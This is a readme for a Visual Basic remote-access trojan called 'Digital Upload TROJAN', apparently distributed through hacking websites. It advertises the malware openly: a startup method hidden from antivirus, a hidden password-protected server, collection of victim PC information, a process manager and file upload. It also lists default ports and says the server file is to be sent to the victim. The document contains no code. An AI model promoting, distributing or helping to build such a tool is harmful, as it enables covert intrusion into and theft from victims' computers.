Digital Upload TROJAN (beta 0)
==============================
By: Digital-1m
==============================
Open Source
==============================
You can download Digital Upload Trojan from : www.digital-1m.com - www.hackboys.com
==============================
Programming language:  Visiual Basic
==============================
new:
1.Server Startup method (hidden from antivirus - Msconfig utilities and other)
2.Server size : 9 kb ( wow!)
3.Server work instead of web downloader, too.
4.Password protected server
5.editable server ( server editor is not available yet!)
6.Hidden server
8.process manager
9.get Victim PC Information.
10.Upload file with working on other files (multi port)
===============================
Default Server port: 19850
Default Upload Port: 19851
default password: 
===============================
web: www.digital1.com
     www.digital1.net
     www.digital1.org
     www.hackboys.com
===============================
Files Included:
	Digital_UT.exe : main client application
	Server.exe : Server file that should send to Victim
	xpbtnocx : ActiveX needed by Client application
	readme.txt : readme file
===============================

